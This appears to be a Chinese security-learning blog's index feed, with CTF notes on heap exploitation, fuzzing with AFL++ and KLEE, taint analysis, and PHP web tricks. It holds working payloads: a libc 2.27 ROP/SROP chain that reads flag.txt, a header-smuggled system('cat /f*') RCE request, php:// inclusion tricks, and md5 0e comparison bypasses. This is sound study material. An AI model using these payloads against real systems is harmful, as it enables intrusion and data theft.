所以我们可以大胆猜测，这个strings_genSplit过后，返回的是一个结构体数组，每个结构体元素是有(void *)ptr,int64 len这种结构，这里就是通过&amp;rsquo;.&amp;lsquo;这个字符进行分割，我进行了验证发现确实如此 //看到split就可以想到是通过某个字符来对整个字符串进行分割，这里是&amp;#39;.&amp;#39; v26 = …  ]]></content></entry><entry><title>AFL++</title><url>/post/fuzz/afl++/</url><categories><category>AEG</category><category>Fuzz</category></categories><tags><tag>fuzz</tag></tags><content type="html"> 参考博客</content></entry><entry><title>libc2.27下的orw</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BBio_file/libc2.27%E4%B8%8B%E7%9A%84orw/</url><categories><category>PWN</category><category>堆攻击IO_FILE</category></categories><tags><tag>libc2.27下的orw</tag></tags><content type="html"><![CDATA[   参考文章 第四届网鼎杯青龙组pwn4的就是一个libc2.27的orw，具体思路如下：
往free_hook写入setcontext+0x35然后delete来执行ROP链。因为free的时候rdi正好指向堆块头部，而libc2.27的setcontext还是根据rdi进行处理，甚至不需要magic gadget，直接就进行ROP了 prdi_ret = libcbase+0x2164f prsi_ret = libcbase+0x23a6a prdx_ret = libcbase+0x1b96 pop_rax=libcbase+0x1b500 syscall_ret=libcbase+0xD2625 #也就是被free的堆块的地址 context_addr = heapbase + 0x0022c0+0x10 flag_string_addr = context_addr + 0x1d0 frame = SigreturnFrame() frame.rsp = context_addr+0xf8 frame.rip = libcbase+0x8aa # print(str(frame)) payload = bytes(frame) payload += p64(prdi_ret)+p64(flag_string_addr)+p64(prsi_ret)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall_ret) payload += p64(prdi_ret)+p64(3)+p64(prsi_ret)+p64(heapbase+0x4000)+p64(prdx_ret)+p64(0x100)+p64(pop_rax)+p64(0)+p64(syscall_ret) payload += p64(prdi_ret)+p64(1)+p64(prsi_ret)+p64(heapbase+0x4000)+p64(prdx_ret)+p64(0x100)+p64(pop_rax)+p64(1)+p64(syscall_ret) # print(hex(len(payload))) # pause() payload = payload.ljust(0x1d0,b&#39;\x00&#39;)+b&#39;flag.txt\x00\x00&#39;   ]]></content></entry><entry><title>论文阅读心得</title><url>/post/%E7%AC%94%E8%AE%B0/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E5%BF%83%E5%BE%97/</url><categories><category>笔记</category></categories><tags><tag/></tags><content type="html"> 记录阅读论文时的心得体会
读论文首先读摘要，这样可以进行文章总览 阅读论文要搞清楚自己阅读这篇论文的目的，不想看的可以直接扔给GPT翻译快速扫一眼过，主要想看的建议先看英文，既可以锻炼英文水平，也更接近原文意思，第一遍看不懂很正常，可以这时候再让GPT翻译，看看自己的理解和翻译相差在哪里，更好地进行学习 读论文当然少不了做笔记，想怎么做笔记都可以 最近发现一个读论文的新方法，就是一般论文都会有大标题，我自己做笔记是每个大标题都会复制自己觉得最重要的、核心的部分内容到笔记中，写上自己的一点体会。 发现读纯英文真的很慢很花时间，发现可以把内容复制给AI，让它先翻译，然后解释其中技术。不懂的可以再细问即可。 1.先翻译这段内容，然后解释这里面的相关技术 2.解释这方面的技术，我在这方面是个小白 3.那为什么这篇论文中要有这个相关技术呢，我没太懂</content></entry><entry><title>Fuzz论文收集</title><url>/post/fuzz/fuzz%E8%AE%BA%E6%96%87%E6%94%B6%E9%9B%86/</url><categories><category>AEG</category><category>Fuzz</category></categories><tags><tag>fuzz</tag></tags><content type="html"><![CDATA[  &#34;KLEE: Unassisted and Automatic Generation of High-Coverage Tests for Complex Systems Programs&#34; (2008) 作者：Cristian Cadar, Daniel Dunbar, Dawson Engler 利用符号执行自动生成高覆盖率测试用例，开创了模糊测试与符号执行结合的先河。 &#34;Fuzzing: Challenges and Reflections&#34; (2017) 作者：Matthew R. Smith, Jacek Czerwonka, Patrice Godefroid, Michael Y. Levin 总结模糊测试中的挑战和未来方向，包括生成高质量输入的难点。 &#34;Angora: Efficient Fuzzing by Principled Search&#34; (2018) 作者：Peng Chen, Hao Chen 利用路径条件优化模糊测试效率，在复杂路径条件下表现突出。 &#34;A Survey of Fuzzing: Techniques, Tools, and Challenges&#34; (2019) 作者：Kumara Koli, K. Alshmrany, et al. 详细综述模糊测试技术、工具及挑战，探讨实际应用中的难点。 &#34;Coverage-Guided Fuzzing for Deep Neural Networks&#34; (2019) 作者：Jie Ren, Tong Che, et al. 探索模糊测试在深度学习模型中的应用，为机器学习模型的测试提供新思路。   ]]></content></entry><entry><title>Fuzzing101笔记</title><url>/post/fuzz/fuzzing101%E7%AC%94%E8%AE%B0/</url><categories><category>AEG</category><category>Fuzz</category></categories><tags><tag>fuzz</tag></tags><content type="html"><![CDATA[  记录一下做这个遇到的问题和理解
Exercise 1 What you will learn
After completing this exercise, you will know the basis of fuzzing with AFL, such as: Compiling a target application with instrumentation Running a fuzzer (afl-fuzz) Triaging crashes with a debugger (GDB) 是pdftotext软件的一个无限递归导致dos的漏洞 ,pdftotext的用法:pdftotext -layout pdf-entrada.pdf pdf-salida.txt
首先对源代码进行插桩编译,这里只要指定编译器为AFL++里对应的编译器即可 export LLVM_CONFIG=&amp;#34;llvm-config-11&amp;#34; CC=$HOME/Fuzz/AFL++/afl-clang-fast CXX=$HOME/Fuzz/AFL++/afl-clang-fast++ ./configure --prefix=&amp;#34;$HOME/fuzzing_xpdf/install/&amp;#34; make make install 启动命令，&amp;ndash;后都是target_file对应的参数 @@: 这是 AFL++ 中的一个特殊占位符。在模糊测试过程中,AFL++ 会将 @@ 替换为当前生成或变异的测试用例文件的路径。 每次 AFL++ 运行一次测试迭代时，它会用一个生成的 PDF 文件路径来替换 @@，以模拟实际输入提供给 pdftotext。 在每次模糊测试迭代中,pdftotext 将： 接收 @@ 替代的 PDF 文件作为输入， 将内容转换为文本， 并将结果保存到 $HOME/fuzzing_xpdf/output。 afl-fuzz -i $HOME/fuzzing_xpdf/pdf_examples/ -o $HOME/fuzzing_xpdf/out/ -s 123 -- $HOME/fuzzing_xpdf/install/bin/pdftotext @@ $HOME/fuzzing_xpdf/output First of all, you …  ]]></content></entry><entry><title>污点分析初探</title><url>/post/%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90/%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E5%88%9D%E6%8E%A2/</url><categories><category>AEG</category><category>污点分析</category></categories><tags><tag>污点分析</tag></tags><content type="html"> 超级超级超级详细的参考博客 这篇博客可以说是非常详尽了，里面讲述了如下内容，以下部分是记得一些笔记和理解
污点分析基本原理 污点传播分析的关键技术 污点分析方法实现:静态、动态、显式、隐式污点分析 污点分析基本原理 污点分析定义 污点分析可以抽象成一个三元组&amp;amp;lt;sources,sinks,sanitizers&amp;amp;gt;的形式,其中,source 即污点源,代表直接引入不受信任的数据或者机密数据到系统中;sink 即污点汇聚点,代表直接产生安全敏感操作(违反数据完整性)或者泄露隐私数据到外界(违反数据保密性);sanitizer 即无害处理,代表通过数据加密或者移除危害操作等手段使数据传播不再对软件系统的信息安全产生危害. 污点分析就是分析程序中由污点源引入的数据是否能够不经无害处理,而直接传播到污点汇聚点.如果不能,说明系统是信息流安全的;否则,说明系统产生了隐私数据泄露或危险数据操作等安全问题.
在漏洞分析中,使用污点分析技术将所感兴趣的数据(通常来自程序的外部输入,假定所有输入都是危险的)标记为污点数据,然后通过跟踪和污点数据相关的信息的流向,可以知道它们是否会影响某些关键的程序操作,进而挖掘程序漏洞. 即将程序是否存在某种漏洞的问题转化为污点信息是否会被 Sink 点上的操作所使用的问题.
污点分析的处理过程可以分成 3 个阶段:
(1) 识别污点源和汇聚点;(根据所分析的系统的不同使用定制的识别策略) (2) 污点传播分析;(利用特定的规则跟踪分析污点信息在程序中的传播过程) (3) 漏洞检测、无害处理 识别污点源和汇聚点 现有的识别污点源和汇聚点的方法可以大致分成 3 类:
(1)使用启发式的策略进行标记,例如把来自程序外部输入的数据统称为“污点”数据,保守地认为这些数据有可能包含恶意的攻击数据(如 PHP Aspis); (2)根据具体应用程序调用的 API 或者重要的数据类型,手工标记源和汇聚点(如 DroidSafe[12]); (3)使用统计或机器学习技术自动地识别和标记污点源及汇聚点.[11] 污点传播分析 污点传播分析就是分析污点标记数据在程序中的传播途径.按照分析过程中关注的程序依赖关系的不同, 可以将污点传播分析分为显式流分析和隐式流分析.
(1)显示流分析
污点传播分析中的显式流分析就是分析污点标记如何随程序中变量之间的数据依赖关系传 …</content></entry><entry><title>fuzz参考博客</title><url>/post/fuzz/fuzz%E5%8F%82%E8%80%83%E5%8D%9A%E5%AE%A2/</url><categories><category>AEG</category><category>Fuzz</category></categories><tags><tag>fuzz</tag></tags><content type="html"> 一位Fuzz&amp;amp;PWN师傅 https://blog.csdn.net/qq_41202237?type=blog Fuzz101学习笔记 https://blog.xmcve.com/2023/01/13/Fuzzing101%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</content></entry><entry><title>KLEE</title><url>/post/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/klee/</url><categories><category>AEG</category><category>符号执行</category></categories><tags><tag>符号执行</tag></tags><content type="html"> KLEE项目地址 KLEE符号执行引擎 是一个强大的工具，通过符号执行技术来测试程序，探索不同的执行路径。KLEE最早由斯坦福大学开发，专门用于系统化地测试C和C++程序的所有可能执行路径。以下是KLEE的工作原理和主要组件(由GPT生成)：
KLEE相关概念 KLEE的关键概念 符号执行：KLEE使用符号变量代替具体值，将输入抽象成符号表达式，这样可以同时代表多个可能的执行路径。KLEE会为每个路径生成一组约束条件，这些条件描述了程序必须满足的路径条件。 约束求解：KLEE依赖约束求解器来判断每个路径的约束条件是否可满足。如果约束条件可解，则KLEE会继续探索该路径；否则，该路径会被丢弃。 路径探索：KLEE系统化地探索尽可能多的路径，以发现潜在的bug、崩溃或意外行为。当识别到错误时，KLEE会生成具体的测试用例来展示问题，帮助开发者复现并修复bug。 KLEE的主要组件 路径选择算法：帮助KLEE决定下一个需要探索的路径。常用策略包括深度优先搜索和广度优先搜索，KLEE允许选择不同策略以实现不同的测试目标。 LLVM基础设施：KLEE运行在LLVM中间表示（IR）之上，而不是直接使用源码，因此能够适应所有可编译为LLVM IR的语言（如C/C++）。 测试用例生成：KLEE通过生成输入的具体值，使程序沿特定路径执行。这一功能对于自动化测试特别有价值，可以覆盖普通单元测试中可能遗漏的边缘情况。 KLEE的应用场景 错误检测：KLEE非常适合于检测缓冲区溢出、内存泄漏和其他安全漏洞。 代码覆盖率：KLEE能产生很高的代码覆盖率，特别适合于关键性的软件系统。 优化与分析：在研究中，KLEE有时用于分析程序行为或优化某些方面，如路径探索的效率。 KLEE的局限性 可扩展性：符号执行计算量庞大，KLEE在处理大型代码库时可能遇到状态爆炸问题。 环境建模：对于复杂系统（如网络、文件或设备交互），精确地模拟这些交互以进行符号执行具有挑战性。 约束复杂性：KLEE的性能高度依赖于约束求解器的效率，如果约束过于复杂，求解速度会变慢。 使用KLEE的步骤 安装LLVM和KLEE：在类Unix操作系统上安装LLVM（通常是兼容的3.4版本）和KLEE。 准备代码：将程序代码编译为LLVM IR（.bc文件）。 运行KLEE：使用.bc文件执行KLEE，指定最大时间、内存约束和路径 …</content></entry><entry><title>符号执行初探</title><url>/post/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%88%9D%E6%8E%A2/</url><categories><category>AEG</category><category>符号执行</category></categories><tags><tag>符号执行</tag></tags><content type="html"> 超级超级超级详细的入门符号执行的文章 这篇博客可以说是非常详尽了，里面讲述了如下内容，以下部分是记得一些笔记和理解
符号执行的过程、原理 静态符号执行到动态符号执行的演变 符号执行的优缺点和展望 还附带了很多参考论文去学习 通俗地理解符号执行 符号执行技术是一种白盒的静态分析技术。即分析程序可能的输入需要能够获取到目标源代码的支持。同时，它是静态的，因为并没有实际的执行程序本身，而是分析程序的执行路径。通过路径分析最终到达我们的目标节点(也就是想让程序走到的代码行)，通过这种方式逆向发现了输入向量。如果把结果条件更改为漏洞条件，理论上也是能够进行漏洞挖掘了。
对于如何根据最终得到的结果求解输入向量，已经有很多现成的数学工具可以使用。上述问题其实可以规约成约束规划的求解问题（更详细的介绍看这里： Constraint_programming ）。比较著名的工具比如SMT（Satisfiability Modulo Theory，可满足性模理论）和SAT。 其实这个概念我是知道的，更简单的例子就是Z3，或者是解方程，约束规划的求解只是更专业的说法了
但是在实际的漏洞分析过程中，目标程序可能更加复杂，没有我们上面的例子这么简单。实际的程序中，可能包含了与外设交互的系统函数，而这些系统函数的输入输出并不会直接赋值到符号中，从而阻断了此类问题的求解。 这个地方其实也很好理解，符号执行是在当前程序中进行路径分析、扩展，但是突然的系统调用函数，我们又不能跟进系统调用的过程进入看变量变化，这就导致中间的变量变化是未知的，所以导致这些系统函数的输入输出并不会直接赋值到符号中，就会影响符号执行的过程
从公式原理上理解符号执行 符号执行的关键思想就是，把输入变为符号值，那么程序计算的输出值就是一个符号输入值的函数。也就是说把具体的值抽象成符号
为了形式化地完成这个任务，符号执行会在全局维护两个变量。其一是符号状态 σ，它表示的是一个从变量到符号表达式的映射。其二是符号化路径约束PC（或者叫路径条件），这是一个==无量词的一阶公式==，用来表示路径条件。在符号执行的开始，符号状态 σ 会先初始化为一个空的映射，而符号化路径约束PC初始化为true。 σ 和PC在符号执行的过程中会不断更新。在符号执行结束时，PC就会用约束求解器进行求解，以生成实际的输入值。这个实际的输入值如果用程序执行， …</content></entry><entry><title>源鲁杯-2024 show_me_the_code</title><url>/post/llvm-pwn/%E6%BA%90%E9%B2%81%E6%9D%AF-2024-show_me_the_code/</url><categories><category>PWN</category><category>LLVM Pwn</category></categories><tags><tag>llvm pwn</tag></tags><content type="html"> 逆向分析 这部分可以说是llvm中最花时间的阶段了，只有逆向过了交互，才能懂得漏洞如何利用
runOnFunction函数 secret::init 主要功能是得到vmkey的值，然后mmap出一段地址,reg[6]=mmap_addr,reg[7]=mmap_addr+0x1000。我大致逆向了一下里面的东西，基本就是涉及xor,sm4,base64,rc4一些算法，直接逆向得到这些key也可以，但是还得保证一部分不出错才行。所以这时候来了一个简单的方法&amp;amp;ndash;动态调试!!!
直接通过动调看运行时vmkey的值，然后又因为这些加解密操作的数值是固定的，所以vmkey的值也是固定的，因此可以直接动调看出来，vmkey=detlfyiruby1145# 验证是否是main入口 这部分动调的时候看了一下就是判断是不是main入口，是的话才执行下面的c0oo0o0Ode::vmRun(this, v9);
同理，这里也可以动调看出来这个值是什么，最终发现是**_Z10c0deVmMainv**这个
VMDatProt::getStrFromProt2( (__int64)v5, (__int64)&amp;amp;amp;anonymous namespace::vmFuncName[abi:cxx11], (__int64)&amp;amp;amp;secret::vmKey[abi:cxx11]); llvm::StringRef::StringRef(v6, v5); v4 = llvm::operator==(Name, v8, v6[0], v6[1]); std::string::~string(v5); 执行函数前的验证-isValidOp函数 首先根据anonymous namespace::ops[abi:cxx11]取出对应的值，然后用vmkey来进行解密，判断函数名是否和给定的一致 一致后进入isValidEnv函数
__int64 __fastcall anonymous namespace::c0oo0o0Ode::isValidEnv(__int64 a1, __int64 a2) { __int64 Type; // rax __int64 v3; // rdx char v5; // [rsp+7h] [rbp-C9h] char v6[32]; // …</content></entry><entry><title>Hugo二级分类功能</title><url>/post/%E7%AC%94%E8%AE%B0/hugo%E4%BA%8C%E7%BA%A7%E5%88%86%E7%B1%BB%E5%8A%9F%E8%83%BD/</url><categories><category>笔记</category></categories><tags/><content type="html"> 探索过程 起初是我想在博客里面实现二级分类，就是有个父目录子目录这样的结构，但是这里的分类是由hugo自己实现的，也就是通过每篇文章的categories这一个参数设置 然后它会自己创建分类，但是实现不了二级标题。
我询问了GPT非常久，浪费了不少时间，它总说hugo的分类是扁平的，要自己写代码渲染搞出来二级分类。我通过网上搜索，查阅官方文档，但都没有得到满意的答案。 这些答案大多是说hugo的框架组成，就是没有讲利用categories设置子分类。
后来我耐心的看网上搜索的内容，因为我本身不会前端，只能参考别人的文章，直到我看到这样一篇文章https://www.voidking.com/dev-hexo-categories/ 这位师傅用的是hexo主题，反正都是博客主题我就想通过类比的方式来看看有没有想要的答案，发现他是通过前端渲染的方式，本来想抄作业，但是发现hugo和hexo架构 有所不同，不能直接抄作业，但是他给了一些links，然后我看了这篇文章https://www.jianshu.com/p/7d0c5e30e0f3
看到他的标题我突然发现我是不是搜索方式不对，导致搜索的结果一直不符合自己的预期。直到我用他的标题改了一下后搜索：hugo主题实现多级分类显示 然后我看到了官方文档https://hugo-next.eu.org/hugo-next-4-5-0-release.html
不是哥们? 这hugo已经实现了这个功能，只要是你在categories下多来一个就可以实现二级分类,我用之前竟然一直都不知道!!!发现确实解决了这个问题，但是我试了一下 三级分类的功能还没实现，可能是开发者还没实现这个功能，但是二级分类已经解决了我的问题
--- categories: - 一级分类 - 二级分类 --- 经验总结 在搜索的过程中我试了很多不同的方式，换关键词，问GPT，花了很多时间。我发现浏览器搜索得到的结果很抽象，就是会把官方文档或者社区文章放在前面，而把很多个人博客放在后面，但其实更有价值的反而是个人博客的内容，因为这正是师傅们探索问题的记录。
所以搜索的时候如果长时间难以解决问题，多看看个人博客，换换搜索的关键词，说不定就有新的答案。</content></entry><entry><title>反序列化</title><url>/post/php/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url><categories><category>WEB</category><category>PHP</category></categories><tags><tag>PHP</tag></tags><content type="html"> 超详细的参考博客 定义 魔法方法 PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 __ 为前缀。 常见的魔法方法如下：
__construct()，类的构造函数 __destruct()，类的析构函数 __call()，在对象中调用一个不可访问方法时调用 __callStatic()，用静态方式中调用一个不可访问方法时调用 __get()，获得一个类的成员变量时调用 __set()，设置一个类的成员变量时调用 __isset()，当对不可访问属性调用isset()或empty()时调用 __unset()，当对不可访问属性调用unset()时被调用。 __sleep()，执行serialize()时，先会调用这个函数 __wakeup()，执行unserialize()时，先会调用这个函数 __toString()，类被当成字符串时的回应方法 __invoke()，调用函数的方式调用一个对象时的回应方法 __set_state()，调用var_export()导出类时，此静态方法会被调用。 __clone()，当对象复制完成时调用 __autoload()，尝试加载未定义的类 __debugInfo()，打印所需调试信息 (1) __construct()：当对象创建时会自动调用(但在unserialize()时是不会自动调用的)。 (2) __wakeup() ：unserialize()时会自动调用 (3) __destruct()：当对象被销毁时会自动调用。 (4) __toString():当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用 (5) __get() :当从不可访问的属性读取数据 (6) __call(): 在对象上下文中调用不可访问的方法时触发 其中特别说明一下第四点：这个 __toString 触发的条件比较多，也因为这个原因容易被忽略，常见的触发条件有下面几种
(1)echo ($obj) / print($obj) 打印时会触发 (2)反序列化对象与字符串连接时 (3)反序列化对象参与格式化字符串时 (4)反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型） (5)反序列化对象参与格式化SQL语句，绑定参数时 (6)反序列化对象 …</content></entry><entry><title>sql注入绕过</title><url>/post/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/</url><categories><category>WEB</category><category>SQL注入</category></categories><tags><tag>SQL注入</tag></tags><content type="html"> 常见的大小写绕过</content></entry><entry><title>文件包含</title><url>/post/web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url><categories><category>WEB</category><category>WEB笔记</category></categories><tags><tag>文件包含</tag></tags><content type="html"><![CDATA[   超级超级详细的参考博客 注意区分文件上传和文件包含，伪协议很重要
简介 allow_url_fopen和allow_url_include 这两个都是php.ini的配置项
allow_url_fopen On 默认开启 该选项为on便是激活了URL形式的fopen封装协议使得可以访问URL对象文件 注意： 此选项只能在 php.ini 中设置 allow_url_include off 默认关闭 该选项为on便是允许包含URL对象文件 注意： 此设置需要启用allow_url_fopen 相关内容 require 找不到被包含的文件时会产生致命错误，并停止脚本运行。 include 找不到被包含的文件时只会产生警告，脚本将继续运行。 include_once 与include类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。 require_once 与require类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含 被包含的文件中含有效的php代码(php标签)，则引入当前文件执行，若不含有效php代码，则直接输出文件内容
伪协议 伪协议总结 只要是能包含文件的地方几乎都可以使用php伪协议，所以很多时候可以利用文件包含来进行ssrf攻击，来获取服务器的本地资源
file协议 需要注意的是，php中涉及到文件以及协议的地方，默认都是使用的file协议。也就是说，如果你没有显式的写出协议名或者协议不存在，都会被当成file协议来解析。
用法 示例 php协议 这个很重要,php://input常用来执行php代码,php://filter常用来读取源码 php://filter 转换过滤器 convert.iconv.UTF-8.UTF-16 实现任意两种编码之间的转换 convert.base64-encode &amp; convert.base64-decode	等同于base64_encode()和base64_decode()，base64编码解码 convert.quoted-printable-encode &amp; convert.quoted-printable-decode	quoted-printable 字符串与 8-bit 字符串编码解码 read,常用于读取源码。php://filter/read=convert.base64-encode/resource=phpinfo.php input
php://input是个可以访问请求的元数据的只读流，可以读取到POST没有解析的原始数据。 注：entype=&#34;multipart/form-data&#34;的时候php://input是无效的。 使用条件： allow_url_fopen: Off/On allow_url_include: Off/On 需要特别注意的是，当allow_url_include为On的时候，会将POST请求中的数据作为PHP代码执行。 其他协议 zip:// &amp; bzip2:// &amp; zlib:// 协议 data:// 协议 http:// &amp; https:// 协议 phar:// 协议   ]]></content></entry><entry><title>php-rce绕过</title><url>/post/php/php-rce%E7%BB%95%E8%BF%87/</url><categories><category>WEB</category><category>PHP</category></categories><tags><tag>PHP</tag></tags><content type="html"><![CDATA[  RCE的绕过就是要多多积累
例子1 $code=$_POST[&#39;e_v.a.l&#39;]; if(!preg_match(&#34;/flag|system|pass|cat|ls/i&#34;,$code)){ eval($code); } [会被解析成下划线_；和反引号去绕过对system函数的过滤，反斜杠绕过flag，tac替换cat命令
POST: e[v.a.l=echo `tac /fla\g`; 例子2 &lt;?php highlight_file(__FILE__); if (&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;star&#39;])) { if(!preg_match(&#39;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#39;,$_GET[&#39;star&#39;])){ eval($_GET[&#39;star&#39;]); } } 这个preg_replace的意思
preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;star&#39;]) preg_replace 是 PHP 中用于进行正则表达式匹配和替换的函数。它接受三个参数： 正则表达式：/[^\W]+\((?R)?\)/ 替换内容：&#39;&#39;（空字符串） 操作对象：$_GET[&#39;star&#39;] 的值 我们先分析一下这个正则表达式 /[^\W]+\((?R)?\)/： /.../：这是正则表达式的分隔符。 [^\W]+：匹配一个或多个字母、数字或下划线字符。[^\W] 的意思是匹配“非非单词字符”（即，匹配的是字母、数字或下划线，这种写法可以简化为 \w）。 \( 和 \)：分别匹配左括号 ( 和右括号 )。 (?R)：这是一个递归模式，表示在括号内可以递归匹配整个正则表达式。因此，它可以匹配嵌套的括号结构。 一眼无参RCE，可以看到这个正则表达式中()里面的东西都被替换为空，所以是无参RCE
用如下方式getflag,下面的内容是burp包里面的东西，注意burp里面其他参数都可以删掉，但是host不能删掉
GET /bo0g1pop.php?star=eval(pos(array_reverse(getallheaders()))); HTTP/1.1 Host: ed6ca05c-a285-4055-b57b-4086bb0e7752.node5.buuoj.cn:81 X-Forwarder-Proto: system(&#39;cat /f*&#39;); 相关函数的一些解释
1. getallheaders() getallheaders() 是 PHP 的一个函数，用来获取所有的 HTTP 请求头。这个函数返回一个关联数组，其中键是请求头的名字，值是对应的请求头内容。例如： [ &#39;Host&#39; =&gt; &#39;example.com&#39;, &#39;User-Agent&#39; =&gt; &#39;Mozilla/5.0&#39;, &#39;Accept&#39; =&gt; &#39;text/html&#39;, ... ] 2. array_reverse(getallheaders()) array_reverse() 会将数组的顺序反转。例如，原来第一个请求头变成了最后一个，最后一个变成了第一个。 在这里，它是将通过 getallheaders() 获取的所有请求头反转顺序。 3. pos(array_reverse(getallheaders())) pos() 是 PHP 中的一个函数，用于获取数组当前指针指向的值，默认指向数组的第一个元素。 因为之前通过 array_reverse() 将请求头数组的顺序反转了，所以 pos() 获取的将是反转后数组的第一个元素（即原来请求头数组中的最后一个元素）。   ]]></content></entry><entry><title>php变量覆盖</title><url>/post/php/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/</url><categories><category>WEB</category><category>PHP</category></categories><tags><tag>PHP</tag></tags><content type="html"><![CDATA[   参考博客 $$覆盖 $与$$区分 在PHP中，$ 和 $$ 的区别主要体现在变量的使用方式上。
$：这是普通的变量符号，用于定义和访问一个变量。比如：
$var = &amp;#34;Hello, World!&amp;#34;; echo $var; // 输出：Hello, World! $$：这是可变变量（Variable Variables），即变量的名称是另一个变量的值。通过 $$，你可以动态地访问或设置变量名。比如：
$var = &amp;#34;name&amp;#34;; $$var = &amp;#34;John&amp;#34;; 这里，$$var 实际上是 $name，因此它相当于：
$name = &amp;#34;John&amp;#34;; 也就是说，$var 的值是 &amp;quot;name&amp;quot;，所以 $$var 等同于 $name，最终 $name 的值被设置为 &amp;quot;John&amp;quot;。
$$ 导致的变量覆盖问题在CTF代码审计题目中经常在foreach中出现，如以下的示例代码，使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。请求?name=test 会将$name的值覆盖，变为test。
&amp;lt;?php //?name=test //output:string(4) “name” string(4) “test” string(4) “test” test $name=’thinking’; foreach ($_GET as $key =&amp;gt; $value) { $$key = $value; } var_dump($key); var_dump($value); var_dump($$key); echo $name; ?&amp;gt; CTF中$$导致的变量覆盖问题的例题1： 题目源码：
&amp;lt;?php include “flag.php”; $_403 = “Access Denied”; $_200 = “Welcome Admin”; if ($_SERVER[&amp;#34;REQUEST_METHOD&amp;#34;] != “POST”) { die(“BugsBunnyCTF is here :p…”); } if ( !isset($_POST[&amp;#34;flag&amp;#34;]) ) { …  ]]></content></entry><entry><title>php常见绕过</title><url>/post/php/php%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87/</url><categories><category>WEB</category><category>PHP</category></categories><tags><tag>PHP</tag></tags><content type="html"><![CDATA[  0e绕过弱比较 对于某些特殊的字符串加密后得到的密文以0e开头，PHP会当作科学计数法来处理，也就是0的n次方，得到的值比较的时候都相同： &lt;?php $a=$_GET[&#39;a&#39;]; $b=$_GET[&#39;b&#39;]; if ($a!==$b &amp;&amp; md5($a)==md5($b)){ return &#34;hahaha&#34;; } md5： 240610708:0e462097431906509019562988736854 QLTHNDT:0e405967825401955372549139051580 QNKCDZO:0e830400451993494058024219903391 PJNPDWY:0e291529052894702774557631701704 NWWKITQ:0e763082070976038347657360817689 NOOPCJF:0e818888003657176127862245791911 MMHUWUV:0e701732711630150438129209816536 MAUXXQC:0e478478466848439040434801845361 sha1： 10932435112: 0e07766915004133176347055865026311692244 aaroZmOk: 0e66507019969427134894567494305185566735 aaK1STfY: 0e76658526655756207688271159624026011393 aaO8zKZF: 0e89257456677279068558073954252716165668 aa3OFF9m: 0e36977786278517984959260394024281014729 0e1290633704: 0e19985187802402577070739524195726831799 双重md5下的0e绕过,以下字符串进行两次md5后以0e开头 7r4lGXCH2Ksu2JNT3BYM CbDLytmyGm2xQyaLNhWn 770hQgrBOjrcqftrlaZk $a==md5($a) 0e215962017 的 MD5 值也是由 0e 开头，在 PHP 弱类型比较中相等 数组绕过 对于php强比较和弱比较：md5()，sha1()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL，也就是相等的。
&lt;?php $a=$_GET[&#39;a&#39;]; $b=$_GET[&#39;b&#39;]; if ($a!==$b &amp;&amp; md5($a)===md5($b)){ return &#34;hahaha&#34;; } 使用： ?a[]=1&amp;b[]=2
strcmp绕过 strcmp是比较两个字符串，如果str1&lt;str2 则返回&lt;0 ，如果str1大于str2则返回&gt;0 ，如果两者相等则返回0。
strcmp比较的是字符串类型，如果强行传入其他类型参数，会出错，出错后返回值0，正是利用这点进行绕过。
这里我们传入非字符串类型，比如数组：?a[]=1
&lt;?php $flag = &#34;flag{xxxxx}&#34;; if (isset($_GET[&#39;a&#39;])) { if (strcmp($_GET[&#39;a&#39;], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。 //比较两个字符串（区分大小写） die(&#39;Flag: &#39;.$flag); else print &#39;No&#39;; } ?&gt; is_numeric绕过 $j = $_POST[j]; is_numeric($j)?die(&#34;&lt;br/&gt;not is numeric &lt;br/&gt;fail 10&#34;):NULL; if($j &gt; 1314){ echo &#34;&lt;br/&gt;pass 10&#34;;} 方法一 利用数组+十六进制来进行绕过,j[]=58B 方法二 利用%20或者%00 j=1315%20 j=1315%00 方法三 php中当一个其他数据类型和数值类型的数据比较大小时，会先将其他数据类型转换成数值类型，这里输入类似9999a数据也可绕过,j=9999a
  ]]></content></entry><entry><title>XFF与XRI</title><url>/post/web/xff%E4%B8%8Exri/</url><categories><category>WEB</category><category>WEB笔记</category></categories><tags><tag>WEB</tag></tags><content type="html"> X-Forwarded-For和X-Real-IP，前者为是用于记录代理信息的,每经过一级代理，该字段就会记录来源地址,经过多级代理，服务端就会记录每级代理的X-Forwarded-For信息，后者则只记录真实发出请求的客户端IP。因此，在请求头里添加一个X-Real-IP为127.0.0.1就可以得到flag的值了。
